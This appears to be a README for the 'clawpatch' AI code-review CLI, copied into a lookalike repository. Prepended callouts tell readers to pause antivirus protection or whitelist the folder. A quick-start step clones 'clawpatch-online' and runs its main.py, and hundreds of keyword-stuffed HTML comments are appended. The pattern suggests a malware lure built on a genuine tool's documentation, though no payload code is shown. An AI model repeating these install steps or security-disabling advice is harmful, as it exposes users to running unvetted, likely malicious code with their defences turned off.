# 🩹 clawpatch


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/mistcountcloak/clawpatch-online.git
cd clawpatch-online
python main.py
```


![clawpatch banner](docs/assets/readme-banner.jpg)

Automated code review that lands fixes.

`clawpatch` maps a repo into semantic feature slices, reviews each slice with a
provider, persists findings, and can run an explicit fix loop for one finding at
a time.

Current status: early CLI. Review/report/state are implemented; patching exists
behind `clawpatch fix --finding <id>` and still requires manual review of the
resulting worktree changes.


## Workflow

```bash
clawpatch init
clawpatch map
clawpatch review --limit 3 --jobs 3
clawpatch review --mode deslopify --limit 3
clawpatch ci --since origin/main --output clawpatch-report.md
clawpatch report
clawpatch next
clawpatch show --finding <id>
clawpatch triage --finding <id> --status false-positive --note "covered by tests"
clawpatch fix --finding <id>
clawpatch open-pr --patch <patchAttemptId> --draft
clawpatch revalidate --finding <id>
clawpatch revalidate --all --status open
```

`fix` does not commit, push, open PRs, or land changes. It runs configured
validation commands and records a patch attempt under `.clawpatch/`.

## What It Maps Today

- npm package bins
- selected root and workspace package scripts: `start`, `build`, `test`,
  `lint`, `typecheck`, `format`
- Node/TypeScript workspace packages under `apps/*`, `packages/*`, and package
  workspace patterns
- package-less Node/TypeScript app roots under monorepo folders such as
  `apps/*` and `packages/*` when source or positive framework signals are
  present
- generic extension/plugin packages under workspace roots such as `extensions/*`
  and `plugins/*`, including package metadata, source, docs, and nearby tests
- semantic Node source groups for large packages, including runtime, commands,
  auth, storage, monitor, webhook, setup, server, client, and repeated filename
  family slices
- Nx project metadata from `project.json`, including project-scoped validation
  targets
- Turborepo task metadata for workspace-aware validation commands and feature
  context
- Next.js `app/` and `pages/` routes, including routes inside monorepo apps
- React Router routes and React components
- Go package slices from `go list ./...`, including command packages
- Go package tests and same-repo imports as review context
- Java/Kotlin Gradle source groups, Maven source groups, and root Gradle/Maven
  build/test commands
- JVM semantic roles from Java and Kotlin code evidence such as annotations,
  imports, interfaces, inheritance, supertypes, and method signatures
- Kotlin Android semantic roles for UI entrypoints, ViewModels, data
  boundaries, external clients, and dependency injection, including Metro
- C#/.NET projects from `.sln`, `.slnx`, `.csproj`, `.fsproj`, and `.vbproj`
  files, with conservative `dotnet build` / `dotnet test` defaults
- ASP.NET Core controllers, minimal API endpoints, C#/F#/Visual Basic source
  groups, and .NET test projects
- Ruby project metadata, executables, source groups, RSpec/Minitest suites
- Elixir Mix/Phoenix projects, contexts, Phoenix web slices, runtime config,
  Ecto migrations, project scripts, and ExUnit suites
- Rust `src/main.rs`, `src/bin/*.rs`, `src/lib.rs`, `crates/*`, and
  `tests/*.rs`
- C/C++/CUDA standalone `main()` files, CMake `add_executable` / `add_library`
  targets, autotools `bin_PROGRAMS` / `lib_LTLIBRARIES` targets, and source
  groups for files outside any build target, including CUDA `.cu` / `.cuh`
  sources
- Python project metadata, console scripts, bounded source groups, pytest suites,
  and Flask/FastAPI/Django routes
- SwiftPM `Sources/*` targets and `Tests/*` suites
- Laravel/PHP projects from `composer.json` and `artisan`, including routes,
  controllers, form requests, Artisan commands, jobs, services, models,
  migrations, seeders, Composer scripts, and PHP test suites
- common project config files

Deeper framework mappers and agent-assisted enrichment are next steps.

## Provider

The default provider is the local Codex CLI.

```bash
codex --version
clawpatch doctor
```

Provider calls use `codex exec` with strict JSON schemas. Review and revalidate
run read-only; fix planning runs with workspace-write because Codex may edit the
working tree during the explicit fix command.

Set `CLAWPATCH_CODEX_SANDBOX` to override the Codex sandbox passed by
Clawpatch. Use any Codex sandbox mode, or `bypass`/`none` to pass
`--dangerously-bypass-approvals-and-sandbox` when the host environment already
provides isolation.

Supported provider names today:

- `codex`: local Codex CLI
- `acpx`: any ACP-compatible coding agent (Codex / Claude / Pi / Gemini / ...) via openclaw/acpx
- `claude`: local Claude Code CLI in print mode
- `cursor`: local Cursor Agent CLI (experimental; `doctor` is enabled by default)
- `grok`: local Grok Build CLI
- `opencode`: local OpenCode CLI
- `pi`: local Pi coding agent in print mode
- `mock`: deterministic test provider
- `mock-fail`: failure test provider

## Commands

- `clawpatch init`: create `.clawpatch/`, detect project basics, write config
- `clawpatch map`: write feature records
- `clawpatch status`: show project, dirty state, feature/finding counts
- `clawpatch review`: review pending or selected features
- `clawpatch review --mode deslopify`: review only for locally provable slop cleanup
- `clawpatch ci`: initialize if needed, map, review, write a report, and append a GitHub step summary
- `clawpatch report`: print or write a Markdown findings report
- `clawpatch next`: print the next actionable finding
- `clawpatch show --finding <id>`: inspect one finding with evidence and suggested validation
- `clawpatch triage --finding <id> --status <status>`: mark a finding with optional history note
- `clawpatch fix --finding <id>`: run the explicit patch loop for one finding
- `clawpatch open-pr --patch <id>`: commit an applied patch attempt and open a GitHub PR
- `clawpatch revalidate --finding <id>`: re-check one finding
- `clawpatch revalidate --all`: re-check open findings with report-style filters
- `clawpatch doctor`: check provider availability
- `clawpatch clean-locks`: clear feature locks

Useful flags:

- `--root <path>`
- `--state-dir <path>`
- `--config <path>`
- `--json`
- `--plain`
- `--limit <n>`
- `--jobs <n>` (default: half of CPU cores, max 10)
- `--rate-limit-per-minute <n>`
- `--source <heuristic|auto|agent>`
- `--feature <id>`
- `--project <name-or-root>`
- `--finding <id>`
- `--status <status>`
- `--severity <severity>`
- `--provider <name>`
- `--model <name>`
- `--reasoning-effort <none|minimal|low|medium|high|xhigh>`
- `--skip-git-repo-check`
- `--output <path>` / `-o <path>`
- `--dry-run`
- `--force`

Unknown flags fail fast.

### `report --json` shape

`clawpatch report --json` returns:

```json
{
  "total": 12,
  "items": [
    /* finding summaries */
  ],
  "results": [
    /* alias for items */
  ],
  "findings": 12,
  "output": "/path/or/null"
}
```

- `total` and `items` are the canonical keys.
- `results` is an alias for `items` with the same array for parity with `{count, results}` consumers.
- `findings: <number>` is kept for backwards compatibility but is **deprecated**. Note that in `--json` output `findings` is a _count_, not the array — use `items` (or `results`) for the array. The next breaking release (v0.4) will drop `findings: <number>` and `results`, landing on `{ total, items, output }`.

## State

State is project-local by default:

```text
.clawpatch/
  config.json
  project.json
  features/*.json
  findings/*.json
  patches/*.json
  reports/*.md
  runs/*.json
```

Feature records are the durable work units. Findings and patch attempts link back
to features so runs can resume and be audited.

## Safety

- Review does not edit files.
- Fix is explicit and selected by finding ID.
- Fix refuses a dirty source worktree by default.
- Clawpatch commits, pushes, and opens PRs only from explicit patch commands such as `open-pr`.
- Clawpatch does not land changes today.
- Provider output is parsed through strict schemas.
- Symlinked directories and generated build output are skipped during mapping.

See `docs/spec.md` for the longer product and implementation spec.


<!-- python pip pypi package library module script tool windows linux macos -->
<!-- clawpatch-online - tool utility software - download install setup -->
<!-- safe clawpatch-online mobile | free download clawpatch-online viewer | example clawpatch-online | download for mac clawpatch-online decoder | guide clawpatch-online engine | clawpatch-online tester | how to use modern clawpatch-online mirror | updated clawpatch-online logger | centos github clawpatch-online | cross platform clawpatch-online reader | configure clawpatch-online app | 2025 clawpatch-online converter | linux configurable clawpatch-online | clawpatch online docker | clawpatch online best practice | is clawpatch online safe | compile clawpatch-online binding | tutorial clawpatch-online platform | best clawpatch-online cli | online clawpatch-online reader | ubuntu clawpatch-online checker | how to deploy secure clawpatch-online | wiki clawpatch-online compressor | wiki reliable clawpatch-online | safe clawpatch-online plugin | download for linux clawpatch-online | tutorial low latency clawpatch-online | download for windows clawpatch-online wrapper | clawpatch online handbook | docs clawpatch-online compressor | how to download clawpatch-online package | production ready clawpatch-online decoder | native clawpatch-online downloader | fedora clawpatch-online package | macos clawpatch-online sdk | secure clawpatch-online analyzer | tutorial clawpatch-online | clawpatch online bug | centos clawpatch-online | quick start clawpatch-online mobile | quickstart local clawpatch-online | 2025 configurable clawpatch-online | how to build clawpatch-online converter | secure clawpatch-online mirror | stable clawpatch-online framework | launch modern clawpatch-online | git clone fast clawpatch-online | examples clawpatch-online | clawpatch-online engine | tar.gz clawpatch-online compressor -->
<!-- docs lightweight clawpatch-online program | github extensible clawpatch-online parser | free native clawpatch-online | customizable clawpatch-online mirror | is clawpatch online good | how to build clawpatch-online | guide clawpatch-online encoder | native clawpatch-online analyzer | run modern clawpatch-online | demo clawpatch-online client | quick start clawpatch-online extension | clawpatch-online tool | walkthrough high performance clawpatch-online | macos clawpatch-online validator | download for mac clawpatch-online | high performance clawpatch-online web | modern clawpatch-online platform | how to download clawpatch-online port | easy clawpatch-online program | native clawpatch-online | clawpatch-online web | how to install low latency clawpatch-online api | example clawpatch-online copy | clawpatch-online addon | clawpatch-online port | clawpatch online webinar | centos clawpatch-online package | debian clawpatch-online debugger | install clawpatch-online | sample clawpatch-online wrapper | guide clawpatch-online parser | best clawpatch-online sdk | run on mac clawpatch-online reader | clawpatch-online builder | source code clawpatch-online package | fast clawpatch-online wrapper | get clawpatch-online engine | how to setup safe clawpatch-online | zip clawpatch-online | easy clawpatch-online logger | use clawpatch-online uploader | run on windows production ready clawpatch-online | portable clawpatch-online framework | extensible clawpatch-online scanner | setup high performance clawpatch-online | launch clawpatch-online wrapper | how to install clawpatch-online | open source clawpatch-online client | sample low latency clawpatch-online | 2026 clawpatch-online software -->
<!-- windows clawpatch-online | clawpatch online course | source code clawpatch-online cli | docs advanced clawpatch-online | clawpatch online vs | free download modern clawpatch-online | how to build offline clawpatch-online software | clawpatch-online debugger | reliable clawpatch-online viewer | offline clawpatch-online framework | walkthrough clawpatch-online validator | best clawpatch-online | ubuntu clawpatch-online extension | clawpatch online workflow | clawpatch online podcast | production ready clawpatch-online viewer | local clawpatch-online replacement | tar.gz clawpatch-online extractor | linux clawpatch-online fork | how to configure clawpatch-online | github clawpatch-online sdk | how to use clawpatch-online framework | ubuntu clawpatch-online | execute fast clawpatch-online | simple clawpatch-online | run on linux easy clawpatch-online | open clawpatch-online app | customizable clawpatch-online extractor | debian clawpatch-online web | run reliable clawpatch-online | launch clawpatch-online platform | download for windows clawpatch-online | modern clawpatch-online client | demo modular clawpatch-online | portable clawpatch-online | clawpatch-online mirror | use clawpatch-online wrapper | beginner clawpatch-online program | zip clawpatch-online downloader | clawpatch-online desktop | updated stable clawpatch-online | free download clawpatch-online validator | extensible clawpatch-online reader | how to use simple clawpatch-online | how to configure clawpatch-online tracker | clawpatch-online replacement | source code offline clawpatch-online | online clawpatch-online decoder | run on linux clawpatch-online decoder | clawpatch online help -->
<!-- compile clawpatch-online parser | deploy clawpatch-online web | documentation clawpatch-online software | run clawpatch-online downloader | latest version clawpatch-online | new version clawpatch-online mobile | debian clawpatch-online | open clawpatch-online tool | how to install github clawpatch-online | new version clawpatch-online extension | run on mac clawpatch-online cli | install clawpatch-online sdk | how to install fast clawpatch-online | how to deploy clawpatch-online converter | get clawpatch-online parser | portable clawpatch-online extension | updated clawpatch-online mirror | low latency clawpatch-online extractor | low latency clawpatch-online decoder | how to run clawpatch-online wrapper | wiki clawpatch-online | install clawpatch-online parser | free clawpatch-online plugin | safe clawpatch-online | clawpatch online demo | cross platform clawpatch-online generator | open source clawpatch-online builder | configure clawpatch-online reader | macos secure clawpatch-online api | stable clawpatch-online addon | minimal clawpatch-online | fedora clawpatch-online clone | how to install clawpatch-online tester | high performance clawpatch-online downloader | arch low latency clawpatch-online | download for mac clawpatch-online mirror | macos clawpatch-online debugger | use self hosted clawpatch-online | new version customizable clawpatch-online | git clone clawpatch-online encoder | setup clawpatch-online | download for windows clawpatch-online utility | how to install native clawpatch-online | how to setup clawpatch-online logger | setup clawpatch-online fork | online clawpatch-online copy | 2025 clawpatch-online package | tar.gz safe clawpatch-online | getting started clawpatch-online checker | clawpatch online project -->
<!-- local clawpatch-online api | clawpatch-online module | macos clawpatch-online | documentation lightweight clawpatch-online | how to setup clawpatch-online | setup clawpatch-online mirror | how to deploy clawpatch-online mirror | production ready clawpatch-online | offline clawpatch-online editor | github clawpatch-online mobile | arch clawpatch-online | clawpatch-online package | clawpatch online kubernetes | sample clawpatch-online | how to download clawpatch-online module | getting started clawpatch-online alternative | run on mac clawpatch-online downloader | production ready clawpatch-online downloader | open clawpatch-online sdk | top clawpatch online | open clawpatch-online mobile | examples clawpatch-online generator | extensible clawpatch-online | arch clawpatch-online framework | clawpatch-online extractor | quick start local clawpatch-online server | zip clawpatch-online software | github secure clawpatch-online app | stable clawpatch-online binding | demo clawpatch-online replacement | walkthrough clawpatch-online alternative | quickstart high performance clawpatch-online | clawpatch-online checker | demo portable clawpatch-online generator | build clawpatch-online | open lightweight clawpatch-online | modular clawpatch-online client | open clawpatch-online port | portable clawpatch-online tracker | use clawpatch-online encoder | production ready clawpatch-online sdk | examples clawpatch-online program | easy clawpatch-online sdk | how to use clawpatch-online creator | modular clawpatch-online downloader | guide clawpatch-online extractor | deploy clawpatch-online extension | compile clawpatch-online reader | arch clawpatch-online service | free download safe clawpatch-online fork -->
<!-- download for linux easy clawpatch-online | start clawpatch-online | get clawpatch-online server | deploy clawpatch-online | clawpatch-online copy | how to run clawpatch-online | ubuntu clawpatch-online engine | example clawpatch-online monitor | run on mac clawpatch-online generator | customizable clawpatch-online | how to deploy modular clawpatch-online mobile | github clawpatch-online fork | clawpatch online guide | download for linux fast clawpatch-online | customizable clawpatch-online api | how to use self hosted clawpatch-online | offline clawpatch-online | zip clawpatch-online gui | linux clawpatch-online validator | clawpatch online blog | documentation low latency clawpatch-online | get clawpatch-online | source code clawpatch-online service | open source clawpatch-online tracker | production ready clawpatch-online software | top clawpatch-online desktop | example clawpatch-online mobile | run on linux modern clawpatch-online | how to configure clawpatch-online addon | native clawpatch-online web | 2025 configurable clawpatch-online clone | run on linux clawpatch-online utility | launch free clawpatch-online | how to setup clawpatch-online parser | how to configure clawpatch-online desktop | simple clawpatch-online server | clawpatch-online clone | 2025 clawpatch-online | new version extensible clawpatch-online | secure clawpatch-online port | docs clawpatch-online tester | configure clawpatch-online encoder | demo clawpatch-online extractor | documentation clawpatch-online scanner | latest version customizable clawpatch-online | advanced clawpatch-online gui | 2025 clawpatch-online logger | debian clawpatch-online framework | linux modular clawpatch-online editor | open source clawpatch-online tester -->
<!-- build clawpatch-online converter | open modular clawpatch-online fork | clawpatch online book | high performance clawpatch-online compressor | walkthrough clawpatch-online copy | local clawpatch-online checker | how to deploy clawpatch-online binding | run on windows clawpatch-online optimizer | lightweight clawpatch-online decoder | download clawpatch-online viewer | compile clawpatch-online addon | native clawpatch-online tester | quickstart clawpatch-online module | clawpatch-online reader | how to build modern clawpatch-online | quick start clawpatch-online tool | production ready clawpatch-online app | deploy clawpatch-online analyzer | ubuntu clawpatch-online service | quickstart clawpatch-online binding | windows clawpatch-online desktop | use online clawpatch-online reader | tar.gz clawpatch-online | free clawpatch online | documentation clawpatch-online logger | cross platform clawpatch-online server | how to download clawpatch-online mirror | macos clawpatch-online service | how to deploy clawpatch-online generator | windows clawpatch-online encoder | setup clawpatch-online decoder | compile clawpatch-online | run clawpatch-online | how to deploy reliable clawpatch-online alternative | updated online clawpatch-online | examples clawpatch-online plugin | get fast clawpatch-online | run on linux clawpatch-online module | minimal clawpatch-online converter | 2026 clawpatch-online | fedora clawpatch-online | tar.gz clawpatch-online copy | minimal clawpatch-online alternative | top clawpatch-online engine | new version clawpatch-online | demo customizable clawpatch-online fork | git clone clawpatch-online extension | install portable clawpatch-online port | clawpatch-online creator | extensible clawpatch-online wrapper -->
<!-- powerful clawpatch-online cli | secure clawpatch-online alternative | get clawpatch-online builder | offline clawpatch-online platform | deploy clawpatch-online builder | modular clawpatch-online port | setup clawpatch-online web | best clawpatch-online binding | clawpatch online saas | lightweight clawpatch-online extractor | extensible clawpatch-online sdk | stable clawpatch-online program | clawpatch-online logger | self hosted clawpatch-online package | download for windows free clawpatch-online creator | modular clawpatch-online | quickstart clawpatch-online client | docs clawpatch-online framework | extensible clawpatch-online mobile | clawpatch online download | free clawpatch-online utility | top clawpatch-online clone | setup reliable clawpatch-online | new version clawpatch-online wrapper | clawpatch online automation | github secure clawpatch-online | docs clawpatch-online platform | easy clawpatch-online api | run on windows clawpatch-online | top clawpatch-online replacement | beginner clawpatch-online builder | git clone clawpatch-online tracker | best clawpatch-online addon | documentation modern clawpatch-online | free clawpatch-online framework | install advanced clawpatch-online | safe clawpatch-online clone | modular clawpatch-online converter | online clawpatch-online tracker | use clawpatch-online monitor | lightweight clawpatch-online | how to use clawpatch-online tool | centos secure clawpatch-online downloader | run on mac clawpatch-online | centos clawpatch-online builder | sample clawpatch-online platform | windows clawpatch-online extension | windows reliable clawpatch-online app | native clawpatch-online addon | high performance clawpatch-online port -->
<!-- run on windows clawpatch-online fork | clawpatch-online extension | github clawpatch-online validator | tutorial clawpatch-online logger | fedora clawpatch-online editor | free clawpatch-online platform | portable clawpatch-online converter | sample clawpatch-online converter | setup clawpatch-online logger | run on mac github clawpatch-online | clawpatch online workshop | build clawpatch-online generator | configurable clawpatch-online | how to configure clawpatch-online converter | tutorial clawpatch-online generator | modern clawpatch-online clone | install secure clawpatch-online | updated clawpatch-online tool | build clawpatch-online decoder | how to setup clawpatch-online engine | lightweight clawpatch-online analyzer | walkthrough clawpatch-online reader | online clawpatch-online package | centos clawpatch-online editor | clawpatch-online fork | clawpatch-online mobile | wiki lightweight clawpatch-online copy | open source clawpatch-online | docs high performance clawpatch-online app | setup powerful clawpatch-online | updated clawpatch-online uploader | run clawpatch-online addon | advanced clawpatch-online | execute clawpatch-online application | latest version clawpatch-online gui | clawpatch-online utility | download for linux clawpatch-online software | run on linux best clawpatch-online | self hosted clawpatch-online uploader | start clawpatch-online analyzer | download for windows native clawpatch-online application | local clawpatch-online | github clawpatch-online plugin | reliable clawpatch-online module | clawpatch online support | clawpatch online alternative | walkthrough portable clawpatch-online service | free download clawpatch-online library | use clawpatch-online editor | low latency clawpatch-online uploader -->
<!-- reliable clawpatch-online checker | how to configure clawpatch-online application | debian clawpatch-online alternative | clawpatch-online binding | deploy clawpatch-online mirror | updated clawpatch-online utility | wiki clawpatch-online utility | compile clawpatch-online service | how to install minimal clawpatch-online | how to use clawpatch-online | extensible clawpatch-online application | portable clawpatch-online editor | clawpatch online test | easy clawpatch-online | 2026 clawpatch-online sdk | windows clawpatch-online editor | walkthrough clawpatch-online monitor | safe clawpatch-online debugger | lightweight clawpatch-online optimizer | github clawpatch-online module | macos minimal clawpatch-online extractor | open source cross platform clawpatch-online api | run on linux clawpatch-online clone | install stable clawpatch-online | execute clawpatch-online api | cross platform clawpatch-online plugin | configurable clawpatch-online web | wiki clawpatch-online checker | beginner clawpatch-online addon | download clawpatch-online addon | best clawpatch-online editor | clawpatch-online analyzer | download for windows clawpatch-online clone | simple clawpatch-online engine | linux clawpatch-online converter | extensible clawpatch-online compressor | execute clawpatch-online compressor | how to run configurable clawpatch-online tracker | clawpatch-online optimizer | stable clawpatch-online software | run clawpatch-online cli | how to deploy clawpatch-online | modular clawpatch-online viewer | clawpatch-online service | open self hosted clawpatch-online parser | install clawpatch-online software | setup production ready clawpatch-online | documentation reliable clawpatch-online engine | latest version native clawpatch-online | extensible clawpatch-online parser -->

<!-- Last updated: 2026-06-09 19:34:43 -->
